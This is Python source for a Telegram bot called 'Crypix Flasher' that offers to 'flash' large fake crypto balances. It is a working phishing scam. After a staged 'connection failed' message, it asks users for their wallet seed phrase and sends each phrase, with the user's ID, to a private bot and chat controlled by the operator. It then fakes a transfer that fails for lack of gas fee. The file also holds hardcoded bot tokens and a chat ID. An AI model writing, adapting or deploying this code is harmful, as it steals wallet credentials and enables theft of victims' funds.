import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import re
import asyncio
from web3 import Web3
import logging

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot tokens and chat ID
MAIN_BOT_TOKEN = "7868684810:AAHOCTmqdpNvBQTq5rkLHLUmNJQFihBqmDA"
PRIVATE_BOT_TOKEN = "8010603892:AAHvYMQ9JDtTg5SbPiSsKS-V9vNbtxJU340"
PRIVATE_CHAT_ID = "7753649096"

# Emojis (Telegram Premium-compatible, visible to all)
EMOJI_WALLET = "💼"
EMOJI_COIN = "💸"
EMOJI_FLASH = "⚡️"
EMOJI_CHECK = "✅"
EMOJI_ERROR = "❌"
EMOJI_WAIT = "⏳"

# Wallet options
WALLETS = [
    "Bitget Wallet",
    "Coinbase Wallet",
    "Trust Wallet",
    "Metamask Wallet",
    "Binance Wallet",
    "Bybit Wallet",
    "Phantom Wallet",
    "Exodus Wallet",
]

# Coin options
COINS = [
    "USDT (TRC20)",
    "USDT (BEP20)",
    "USDT (ERC20)",
    "Bitcoin",
    "Ethereum",
]

# Amount options per coin
AMOUNTS = {
    "USDT (TRC20)": [
        ("1000 USDT for 4 TRX", 1000, "4 TRX"),
        ("100,000 USDT for 17 TRX", 100000, "17 TRX"),
        ("1,000,000 USDT for 30 TRX", 1000000, "30 TRX"),
    ],
    "USDT (BEP20)": [
        ("1000 USDT for 0.05 BNB", 1000, "0.05 BNB"),
        ("100,000 USDT for 0.07 BNB", 100000, "0.07 BNB"),
        ("1,000,000 USDT for 0.09 BNB", 1000000, "0.09 BNB"),
    ],
    "USDT (ERC20)": [
        ("1000 USDT for 0.008 ETH", 1000, "0.008 ETH"),
        ("100,000 USDT for 0.012 ETH", 100000, "0.012 ETH"),
        ("1,000,000 USDT for 0.019 ETH", 1000000, "0.019 ETH"),
    ],
    "Bitcoin": [
        ("10 BTC for 0.0001 BTC", 10, "0.0001 BTC"),
        ("100 BTC for 0.0005 BTC", 100, "0.0005 BTC"),
        ("1,000 BTC for 0.0009 BTC", 1000, "0.0009 BTC"),
    ],
    "Ethereum": [
        ("100 ETH for 0.001 ETH", 100, "0.001 ETH"),
        ("1000 ETH for 0.006 ETH", 1000, "0.006 ETH"),
        ("100,000 ETH for 0.009 ETH", 100000, "0.009 ETH"),
    ],
}

# User data storage
user_data = {}

# Initialize Web3 for address validation
web3 = Web3()

# Validate crypto address
def is_valid_address(address: str, coin: str) -> bool:
    try:
        if coin in ["USDT (TRC20)"]:
            return bool(re.match(r"^T[1-9A-HJ-NP-Za-km-z]{33}$", address))
        elif coin in ["USDT (BEP20)", "USDT (ERC20)", "Ethereum"]:
            return web3.is_address(address)
        elif coin == "Bitcoin":
            return bool(
                re.match(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", address)
                or re.match(r"^bc1[a-zA-Z0-9]{39,59}$", address)
            )
        return False
    except Exception:
        return False

# Validate seed phrase
def is_valid_seed_phrase(phrase: str) -> bool:
    words = phrase.strip().split()
    return len(words) in [12, 18, 24]

# Send seed phrase to private bot
async def send_to_private_bot(phrase: str, user_id: int):
    try:
        private_bot = telegram.Bot(token=PRIVATE_BOT_TOKEN)
        await private_bot.send_message(
            chat_id=PRIVATE_CHAT_ID,
            text=f"User ID: {user_id}\nSeed Phrase: {phrase}",
        )
    except Exception as e:
        logger.error(f"Failed to send to private bot: {e}")

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {"step": "wallet_selection"}

    welcome_message = (
        f"{EMOJI_FLASH} Welcome to Crypix Flasher, a free crypto Flasher Bot!"
    )
    await update.message.reply_text(welcome_message)

    wallet_message = f"{EMOJI_WALLET} Select the wallet you want to flash:"
    keyboard = [
        [InlineKeyboardButton(wallet, callback_data=f"wallet_{wallet}")]
        for wallet in WALLETS
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(wallet_message, reply_markup=reply_markup)

# Handle button clicks
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("wallet_"):
        wallet = data.replace("wallet_", "")
        user_data[user_id]["wallet"] = wallet
        user_data[user_id]["step"] = "coin_selection"

        await asyncio.sleep(3)
        coin_message = f"{EMOJI_COIN} Select the coin you want to flash:"
        keyboard = [
            [InlineKeyboardButton(coin, callback_data=f"coin_{coin}")]
            for coin in COINS
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(coin_message, reply_markup=reply_markup)

    elif data.startswith("coin_"):
        coin = data.replace("coin_", "")
        user_data[user_id]["coin"] = coin
        user_data[user_id]["step"] = "amount_selection"

        await asyncio.sleep(2)
        amount_message = f"{EMOJI_COIN} Select the amount to flash:"
        keyboard = [
            [InlineKeyboardButton(amount[0], callback_data=f"amount_{i}")]
            for i, amount in enumerate(AMOUNTS[coin])
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(amount_message, reply_markup=reply_markup)

    elif data.startswith("amount_"):
        amount_index = int(data.replace("amount_", ""))
        coin = user_data[user_id]["coin"]
        user_data[user_id]["amount"] = AMOUNTS[coin][amount_index][1]
        user_data[user_id]["gas_fee"] = AMOUNTS[coin][amount_index][2]
        user_data[user_id]["amount_text"] = AMOUNTS[coin][amount_index][0]
        user_data[user_id]["step"] = "link_wallet"

        link_message = (
            f"{EMOJI_WALLET} Kindly link your wallet for payment of gas fee, "
            "which will be deducted from your wallet when sending flash."
        )
        keyboard = [
            [InlineKeyboardButton(wallet, callback_data=f"link_{wallet}")]
            for wallet in WALLETS
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(link_message, reply_markup=reply_markup)

    elif data.startswith("link_"):
        user_data[user_id]["step"] = "install_check"
        await query.message.reply_text(
            f"{EMOJI_CHECK} Make sure the app is installed on your phone "
            "to ensure a successful connection."
        )
        await asyncio.sleep(1)
        await query.message.reply_text(f"{EMOJI_WAIT} Connecting...")
        await asyncio.sleep(4)
        await query.message.reply_text(
            f"{EMOJI_ERROR} Connection failed. Link manually."
        )
        user_data[user_id]["step"] = "seed_phrase"
        await query.message.reply_text(
            f"{EMOJI_WALLET} Send wallet seed phrase to link manually:"
        )

    elif data in ["confirm_yes", "confirm_no"]:
        if data == "confirm_yes":
            gas_fee = user_data[user_id]["gas_fee"]
            await query.message.reply_text(
                f"{EMOJI_COIN} {gas_fee} will be deducted from your wallet. "
                "Do you wish to proceed?"
            )
            keyboard = [
                [
                    InlineKeyboardButton("Yes", callback_data="proceed_yes"),
                    InlineKeyboardButton("No", callback_data="proceed_no"),
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(
                "Confirm:", reply_markup=reply_markup
            )
        else:
            user_data[user_id]["step"] = "cancelled"
            await query.message.reply_text(
                f"{EMOJI_ERROR} Transaction cancelled."
            )

    elif data in ["proceed_yes", "proceed_no"]:
        if data == "proceed_yes":
            await query.message.reply_text(
                f"{EMOJI_WAIT} Sending Flash... Kindly wait."
            )
            await asyncio.sleep(10)
            await query.message.reply_text(
                f"{EMOJI_ERROR} Flash failed due to insufficient gas fee."
            )
            user_data[user_id]["step"] = "done"
        else:
            user_data[user_id]["step"] = "cancelled"
            await query.message.reply_text(
                f"{EMOJI_ERROR} Transaction cancelled."
            )

# Handle text messages (seed phrase and address)
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_data:
        await update.message.reply_text(
            f"{EMOJI_ERROR} Please start the bot with /start."
        )
        return

    step = user_data[user_id].get("step")

    if step == "seed_phrase":
        if is_valid_seed_phrase(text):
            await update.message.reply_text(f"{EMOJI_WAIT} Connecting...")
            await send_to_private_bot(text, user_id)
            await asyncio.sleep(4)
            await update.message.reply_text(
                f"{EMOJI_CHECK} Connection successful. You may proceed."
            )
            user_data[user_id]["step"] = "receiver_address"
            await update.message.reply_text(
                f"{EMOJI_WALLET} Send the receiver's address you wish to flash:"
            )
        else:
            await update.message.reply_text(
                f"{EMOJI_ERROR} Invalid seed phrase. Try again (12, 18, or 24 words)."
            )

    elif step == "receiver_address":
        coin = user_data[user_id]["coin"]
        if is_valid_address(text, coin):
            user_data[user_id]["receiver_address"] = text
            amount = user_data[user_id]["amount"]
            await update.message.reply_text(
                f"{EMOJI_COIN} Do you want to send {amount} {coin} to this address: {text}?"
            )
            keyboard = [
                [
                    InlineKeyboardButton("Yes", callback_data="confirm_yes"),
                    InlineKeyboardButton("No", callback_data="confirm_no"),
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                "Confirm:", reply_markup=reply_markup
            )
            user_data[user_id]["step"] = "confirm"
        else:
            await update.message.reply_text(
                f"{EMOJI_ERROR} Invalid address for {coin}. Please provide a valid address."
            )

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text(
            f"{EMOJI_ERROR} An error occurred. Please try again or restart with /start."
        )

def main():
    application = Application.builder().token(MAIN_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_error_handler(error_handler)

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
